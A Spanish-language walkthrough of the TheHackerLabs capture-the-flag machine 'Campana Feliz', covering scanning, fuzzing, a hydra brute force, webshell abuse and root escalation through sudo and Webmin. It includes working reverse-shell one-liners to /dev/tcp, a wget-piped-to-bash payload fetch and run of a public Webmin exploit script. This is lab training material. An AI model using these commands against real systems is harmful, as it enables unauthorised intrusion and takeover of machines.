---
title: "Campana Feliz - TheHackerLabs"
date: 2025-07-18
draft: false
slug: "THL-writeup-campanaFeliz"
excerpt: "Después de analizar los escaneos, pasamos a analizar las dos páginas web activas. Descubrimos el uso de Webmin en la página web activa del puerto 10000. También descubrimos una pista en el código fuente de la página web activa en el puerto 8088 y aplicando Fuzzing, descubrimos un login al que le aplicamos fuerza bruta para ganar acceso. Al entrar, vemos que es una WebShell, lo que nos permite ejecutar una Reverse Shell desde un servidor web remoto de Python de nuestra máquina, con tal de ganar acceso a la máquina víctima. Ya en la máquina, descubrimos que nuestro usuario puede ejecutar la Bash con privilegios de Root, lo que nos permite escalar privilegios fácilmente para ser Root. Además, encontramos un archivo con credenciales de acceso al Webmin. Al entrar, vemos que es posible utilizar la Shell de Comandos y la Terminal para mandarnos una Reverse Shell, pero al recibirla, resulta que ganamos acceso como Root, pues es este quien ejecuta el Webmin."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Webmin", "Web Enumeration", "Fuzzing", "BurpSuite", "Brute Force Attack", "WebShell to Reverse Shell", "Abusing Sudoers Privileges", "Abusing Webmin Tools", "Privesc - Abusing Sudoers Privileges", "Privesc - Abusing Webmin Tools", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "echo"
  - "base64"
  - "ffuf"
  - "gobuster"
  - "hydra"
  - "BurpSuite"
  - "nc"
  - "bash"
  - "nano"
  - "wget"
  - "python3"
  - "grep"
  - "sudo"
links:
  - "https://webmin.com/security/"
  - "https://github.com/enisecur1ty/Webmin-RCE-Leading-to-Root-Privilege-Escalation/tree/main"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-campanaFeliz/campana_feliz.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.200
PING 192.168.10.200 (192.168.10.200) 56(84) bytes of data.
64 bytes from 192.168.10.200: icmp_seq=1 ttl=64 time=1.45 ms
64 bytes from 192.168.10.200: icmp_seq=2 ttl=64 time=1.24 ms
64 bytes from 192.168.10.200: icmp_seq=3 ttl=64 time=13.8 ms
64 bytes from 192.168.10.200: icmp_seq=4 ttl=64 time=0.870 ms

--- 192.168.10.200 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3020ms
rtt min/avg/max/mdev = 0.870/4.327/13.757/5.447 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.200 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 14:18 CST
Initiating ARP Ping Scan at 14:18
Scanning 192.168.10.200 [1 port]
Completed ARP Ping Scan at 14:18, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:18
Scanning 192.168.10.200 [65535 ports]
Discovered open port 22/tcp on 192.168.10.200
Discovered open port 10000/tcp on 192.168.10.200
Discovered open port 8088/tcp on 192.168.10.200
Completed SYN Stealth Scan at 14:18, 6.61s elapsed (65535 total ports)
Nmap scan report for 192.168.10.200
Host is up, received arp-response (0.0010s latency).
Scanned at 2025-07-17 14:18:22 CST for 6s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 64
8088/tcp  open  radan-http       syn-ack ttl 64
10000/tcp open  snet-sensor-mgmt syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65538 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, pero es curioso ver el **puerto 8088 y 10000** abiertos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,8088,10000 192.168.10.200 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 14:19 CST
Nmap scan report for 192.168.10.200
Host is up (0.00096s latency).

PORT      STATE SERVICE               VERSION
22/tcp    open  ssh                   OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)

| ssh-hostkey: 
|   256 3d:9f:d1:71:81:33:e4:14:8a:78:1c:16:b4:a3:22:da (ECDSA)
|_  256 74:3f:23:c1:c2:68:1e:b5:72:44:8a:8c:02:e4:e5:02 (ED25519)
8088/tcp  open  http                  Apache httpd 2.4.62 ((Debian))

|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  ssl/snet-sensor-mgmt?

| ssl-cert: Subject: commonName=debian/countryName=US
| Subject Alternative Name: DNS:debian, DNS:localhost
| Not valid before: 2024-12-09T08:17:52
|_Not valid after:  2029-12-08T08:17:52
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 Document follows
|     Date: Thu, 17 Jul 2025 20:19:27 GMT
|     Server: MiniServ
|     Connection: close
|     Auth-type: auth-required=1
|     Set-Cookie: redirect=1; path=/; secure; httpOnly
|     Set-Cookie: testing=1; path=/; secure; httpOnly
|     X-Frame-Options: SAMEORIGIN
|     Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
|     X-Content-Type-Options: nosniff
|     X-no-links: 1
|     Content-type: text/html; Charset=UTF-8
|     <!DOCTYPE HTML>
|     <html data-bgs="gainsboro" class="session_login">
|     <head>
|     <meta name="color-scheme" content="only light">
|_    <noscript> <style> html[data-bgs="gainsboro"] { background-color: #d6d6d6; } html[data-bgs="nightRider"] { background-color: #1a1c20; } html[data-bgs="nightRider"] div[data-noscript] { color: #979ba080; } html[data-slider-fixed='1'] { margin-right: 0 !important; } body > div[data-noscript] ~ * { display: none !impo
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.95%T=SSL%I=7%D=7/17%Time=68795ACB%P=x86_64-pc-linux-g
...
...
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.72 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El **puerto 8088** está mostrando la página por defecto de **Apache2** y parece que el **puerto 10000** está mostrando un login.

Vamos a ver si encontramos algo en la página web del **puerto 8088** y luego iremos al login del **puerto 10000**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web de Puerto 8088 {#Puerto8088}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura1.png">
</p>

Muy extraño, todo está en blanco y **Wappalizer** tiene problemas para detectar las tecnologías usadas.

Veamos qué nos dice **whatweb**:
```bash
whatweb http://192.168.10.200:8088
http://192.168.10.200:8088 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.10.200]
```
No veo más tecnologías involucradas.

Veamos si hay algo en el código fuente:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura2.png">
</p>

Bien, tenemos dos mensajes codificados en **base64**.

Si los decodificamos, obtendremos lo siguiente:
```bash
echo -n "Q2FtcGFuYSBzb2JyZSBjYW1wYW5hCgpZIHNvYnJlIGNhbXBhbmEgdW5hCgpBc8OzbWF0ZSBhIGxhIHZlbnRhbmEKClZlcsOhcyBlbCBuacOxbyBlbiBsYSBjdW5hCg==" | base64 -d
Campana sobre campana

Y sobre campana una

Asómate a la ventana

Verás el niño en la cuna
                                                                                                                                                                                              
echo -n "Q2FtcGFuYSBDYW1wYW5hIENhTXBBTkEgQ2FNcGFOYQo=" | base64 -d
Campana Campana CaMpANA CaMpaNa
```
El primer mensaje es como una letra de alguna canción, pero el segundo mensaje, nos está mostrando un usuario y/o una posible contraseña que quizá sean válidas para el login del puerto **10000**.

Lo probaremos más adelante.

De momento, no encontramos nada más, así que vamos a aplicar **Fuzzing** para buscar algún directorio oculto.

### Fuzzing {#fuzz}

Para ahorrarte un poco de tiempo, no encontré ningún directorio oculto, por lo que enfoqué el **Fuzzing** para buscar algún archivo oculto.

Primero, usaremos **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.200:8088/FUZZ -t 300 -e .html,.txt,.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.200:8088/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 196, Words: 5, Lines: 7, Duration: 49ms]
shell.php               [Status: 200, Size: 1359, Words: 564, Lines: 44, Duration: 63ms]
.html                   [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 1ms]
.php                    [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 3ms]
                        [Status: 200, Size: 196, Words: 5, Lines: 7, Duration: 8ms]
server-status           [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 44ms]
:: Progress: [882180/882180] :: Job [1/1] :: 268 req/sec :: Duration: [0:06:45] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para indicar extensiones de archivos a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.200:8088/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x html,txt,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.200:8088/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 196]
/shell.php            (Status: 200) [Size: 1359]
/.php                 (Status: 403) [Size: 282]
/.html                (Status: 403) [Size: 282]
/server-status        (Status: 403) [Size: 282]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar extensiones de archivos a buscar. |

En ambos casos, encontramos una página llamada **shell.php**.

Veamos de que se trata.

### Analizando Página Descubierta con Fuzzing {#Shell}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura3.png">
</p>

Hemos descubierto un login que nos da acceso a una Shell (quizá una WebShell).

Probamos como usuario y contraseña el segundo mensaje que decodificamos, pero no funcionó:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura4.png">
</p>

El mensaje de error, no nos dice si el usuario existe o no.

El código fuente no nos da alguna pista como tal y, si le aplicamos algunas **inyecciones SQL**, no parece que estén funcionando.

Por último, vayamos a ver el login del **puerto 10000**.

### Analizando Login de Puerto 10000 {#login}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura5.png">
</p>

Es el login de **Webmin**.

| **Webmin** |
|:--------------:|
| *Webmin es una interfaz web para administrar sistemas Unix/Linux. Permite a los administradores gestionar un sistema completo (como servidores, usuarios, servicios, redes, etc.) a través del navegador, sin necesidad de usar la línea de comandos.* |

Si intentamos probar como usuario y contraseña el segundo mensaje codificado, no nos dará acceso, aunque el mensaje de error no indica si el usuario existe o no:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura6.png">
</p>

Tampoco podemos obtener la versión que se esté usando de **Webmin**.

Lo que nos queda por hacer, es intentar aplicar fuerza bruta a ambos logins.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Login de Página shell.php {#fuerzaBruta}

Primero, aplicaremos la fuerza bruta en el login del **puerto 8088**.

Como usuario utilizaremos **campana**, ya que es una de las pistas que tenemos del segundo mensaje que decodificamos.

Y esta vez, utilizaremos el mensaje de error como un filtro, para que busque una contraseña que no obtenga ese error:
```bash
hydra -l 'campana' -P /usr/share/wordlists/rockyou.txt 192.168.10.200 -s 8088 http-form-post '/shell.php:username=^USER^&password=^PASS^:F=Username or password invalid' -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 15:05:56
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://192.168.10.200:8088/shell.php:username=^USER^&password=^PASS^:F=Username or password invalid
[8088][http-post-form] host: 192.168.10.200   login: campana   password: *****
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-17 15:06:09
```
Excelente, encontramos la contraseña.

Vamos a probarla:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura7.png">
</p>

Esto es una **WebShell**.

### Probando Ejecución de Comandos de WebShell y Obteniendo una Reverse Shell {#webshell}

Probemos a ejecutar el comando **whoami**:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura8.png">
</p>

Se ve bien, pero necesitamos ver cómo se está enviando la petición.

Vuelve a ejecutar el comando para capturar la petición con **BurpSuite** y luego mandala al **Repeater**:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura9.png">
</p>

Como data, se utiliza el parámetro **cmd** y el comando a ejecutar.

Entonces, es posible que podamos mandarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Escribe el siguiente comando y ejecútalo:
```bash
bash+-i+>%26+/dev/tcp/Tu_IP/443+0>%261
```

Pero no obtendremos nada, pues algo falla cuando intentamos ejecutar este comando:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura10.png">
</p>

Algo que podemos hacer es, guardar nuestra **Reverse Shell** en un archivo dentro de nuestra máquina y alzar un servidor web con **Python3**, para que desde la **WebShell** ejecutemos ese script y obtengamos la **Reverse Shell**.

Entonces, guarda el mismo comando en un script:
```bash
nano revShell.sh
----------------
bash -i >& /dev/tcp/Tu_IP/443 0>&1
```

Levanta un servidor web con **Python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora, tenemos dos opciones:
* Descargar el script de la **Reverse Shell** en la máquina víctima y luego ejecutarlo desde ahí.
* Ejecutar el script de manera remota y obtener la **Reverse Shell**.

Haremos ambos.

#### Descargando y Ejecutando Reverse Shell en la Máquina Víctima {#Descarga}

Probemos si tenemos **wget** o **curl**:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura11.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura12.png">
</p>

Tenemos solamente **wget**.

Podemos descargar el script en el directorio `/tmp` que es donde tendríamos permisos para hacer descargas:
```bash
wget http://Tu_IP/revShell.sh -O /tmp/revShell.sh
```

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura13.png">
</p>

No vemos una respuesta en la página web, pero si revisamos nuestro servidor, veremos que se descargó el script:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.10.200 - - [17/Jul/2025 18:57:18] "GET /revShell.sh HTTP/1.1" 200 -
```

Igual podemos verificar si se guardó el script donde indicamos:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura14.png">
</p>

Y para ejecutarlo, utilizamos el comando **bash** más la ruta del script:
```bash
bash /tmp/revShell.sh
```

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura15.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.200] 36720
bash: cannot set terminal process group (503): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:/var/www/html$ whoami
whoami
www-data
```
Estamos dentro.

#### Ejecutando Script de Reverse Shell de Manera Remota con wget {#Remoto}

Esta forma es más sencilla, pues vamos a ejecutar el script remotamente con **wget** de la siguiente forma:
```bash
wget -qO- http://Tu_IP/revShell.sh | bash
```

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura16.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.200] 51824
bash: cannot set terminal process group (503): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:/var/www/html$ whoami
whoami
www-data
```
Estamos dentro otra vez.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Escalando Privilegios con Privilegios Sobre Binario Bash {#linEnum}

Veamos qué usuarios existen:
```bash
www-data@debian:/var/www/html$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
bob:x:1001:1001:,,,:/home/bob:/bin/bash
```
Solo existe el **usuario bob**.

Pero no podremos ver el contenido de su directorio:
```bash
www-data@debian:/var/www/html$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Dec  9  2024 .
drwxr-xr-x 18 root root 4096 Dec  8  2024 ..
drwx------  2 bob  bob  4096 Dec  9  2024 bob
```

Buscando un poco, encontramos un archivo de texto interesante en el directorio `/opt`:
```bash
www-data@debian:/var/www/html$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 Dec  9  2024  .
drwxr-xr-x 18 root root 4096 Dec  8  2024  ..
-rw-r--r--  1 root root   59 Dec  9  2024 'CMS Webmin.txt'
```

Si lo leemos, habremos encontrado las credenciales de acceso al **Webmin**:
```bash
www-data@debian:/var/www/html$ cat /opt/'CMS Webmin.txt'
url: https://IP:10000
login: santaclaus / ********
```

Antes de ir a probarlas, veamos si podemos ver los privilegios de este usuario:
```bash
www-data@debian:/var/www/html$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /bin/bash
```
Genial, podemos usar la **Bash** como **Root**.

Entonces, solamente tenemos que ejecutar la **Bash** con privilegios y seremos **Root**:
```bash
www-data@debian:/var/www/html$ sudo bash -p
root@debian:/var/www/html# whoami
root
```
Podríamos dar por terminada la máquina aquí, pero hay un par de escaladas que podemos hacer.

Si no deseas continuar con eso, solamente tienes que buscar las flag:
```bash
root@debian:/var/www/html# ls /home/bob/
user.txt
root@debian:/var/www/html# cat /home/bob/user.txt
...
root@debian:/var/www/html# cd /root
root@debian:~# ls
root.txt  webmin-1.920	webmin-1.920.tar.gz
root@debian:~# cat root.txt
...
```
Listo.

### Probando Credenciales de Webmin y Escalando Privilegios con Shell Activa de Root {#Webmin}

Probemos las credenciales que encontramos:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura17.png">
</p>

Ahí podemos ver la versión del **Webmin**.

Del lado izquierdo en la sección de **Tools**, veremos que podemos usar una **Shell de Comandos** o una **Terminal**:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura18.png">
</p>

Probemos primero la **Shell de Comandos**:

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura19.png">
</p>

Funciona y nos indica que somos **Root**.

Entonces, vamos a mandarnos una **Reverse Shell** desde aquí.

Abre un listener con **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
```

Prueba la misma **Reverse Shell** que usamos anteriormente:
```bash
bash -c 'bash -i >& /dev/tcp/Tu_IP/1337 0>&1'
```

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura20.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.200] 34514
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
root@debian:~# whoami
whoami
root
```
Funcionó correctamente.

Esto también podemos hacerlo desde la **Terminal** de **Webmin**.

<p align="center">
<img src="/assets/images/THL-writeup-campanaFeliz/Captura21.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.200] 43600
root@debian:~# whoami
whoami
root
```
Somos **Root** otra vez.

### Escalando Privilegios Abusando de Versión Vulnerable de Webmin con Script de GitHub {#Github}

Por último, si buscamos algún Exploit para la **versión 2.202 de Webmin**, encontraremos un repositorio que contiene un script que obtiene una **Reverse Shell** como **Root**:
* <a href="https://github.com/enisecur1ty/Webmin-RCE-Leading-to-Root-Privilege-Escalation/tree/main" target="_blank">Repositorio de enisecr1ty: Webmin RCE Leading to Privilege Escalation</a>

Este script aprovecha la **Shell** de la sección **Tools** para mandar una **Reverse Shell** a un listener que tengas activo.

Debes darle los siguientes parámetros:
* La IP de la página web donde está activo el **Webmin**.
* El puerto donde está activo el **Webmin**.
* El usuario y contraseña para pasar al login.
* Y le debemos dar nuestra IP y el puerto usado en el listener.

Vamos a descargar solo el script:
```bash
wget https://raw.githubusercontent.com/enisecur1ty/Webmin-RCE-Leading-to-Root-Privilege-Escalation/refs/heads/main/webmin_exploit.py
```

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Configura y ejecuta el script:
```bash
python3 webmin_exploit.py -rhost 192.168.10.200 -rport 10000 -u santaclaus -p FelizNavidad2024 -lhost Tu_IP -lport 443
Attempting to log in...
Login successful!
Check your listener on Tu_IP:443
```

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.200] 40580
whoami
root
```
Volvimos a ganar acceso a la máquina víctima como **Root**.

Ya solo falta que obtengas una shell interactiva y listo.
